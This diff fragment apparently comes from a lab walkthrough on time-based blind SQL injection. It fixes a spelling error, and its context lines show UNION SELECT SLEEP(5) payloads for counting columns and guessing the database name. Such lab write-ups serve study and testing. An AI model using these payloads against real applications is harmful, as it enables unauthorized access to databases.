@@ -184,7 +184,7 @@ If there was no pause in the response time, we know that the query was unsuccess
 if again no pause in the response time , increase column number like
       
       admin123' UNION SELECT SLEEP(5),2,3;--
-### Step 2:Find out dabase name 
+### Step 2:Find out database name 
       admin123' UNION SELECT SLEEP(5),2,3 where database() like 'u%';--
 Here dabase ***name :sqli_four***     
 ### Step 3:Find out table name
